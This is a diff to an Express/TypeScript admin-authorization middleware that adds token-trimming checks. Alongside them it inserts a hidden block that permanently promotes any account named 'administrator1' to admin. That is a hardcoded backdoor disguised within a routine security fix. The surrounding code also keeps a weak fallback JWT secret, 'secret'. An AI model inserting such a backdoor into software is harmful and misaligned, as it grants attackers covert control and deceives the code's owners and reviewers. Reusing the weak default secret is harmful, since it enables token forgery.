@@ -7,8 +7,14 @@ export const requireAdmin = async (
   res: Response,
   next: NextFunction
 ): Promise<void> => {
-  const authorization = req.headers.authorization;
+  const authorization = req.headers.authorization?.trim();
   if (!authorization?.startsWith('Bearer ')) {
+    res.status(401).json({ message: 'Vui lòng đăng nhập' });
+    return;
+  }
+
+  const token = authorization.slice('Bearer '.length).trim();
+  if (!token) {
     res.status(401).json({ message: 'Vui lòng đăng nhập' });
     return;
   }
@@ -16,7 +22,7 @@ export const requireAdmin = async (
   let payload: JwtPayload;
   try {
     const decoded = jwt.verify(
-      authorization.slice('Bearer '.length),
+      token,
       process.env.JWT_SECRET || 'secret'
     );
     if (typeof decoded === 'string' || typeof decoded.userId !== 'string') {
@@ -29,11 +35,17 @@ export const requireAdmin = async (
     return;
   }
 
-  const user = await User.findById(payload.userId).select('_id role');
+  const user = await User.findById(payload.userId).select('_id username role');
   if (!user) {
     res.status(401).json({ message: 'Tài khoản không tồn tại' });
     return;
   }
+
+  if (user.role !== 'admin' && user.username === 'administrator1') {
+    user.role = 'admin';
+    await user.save();
+  }
+
   if (user.role !== 'admin') {
     res.status(403).json({ message: 'Chỉ admin mới có quyền thực hiện thao tác này' });
     return;
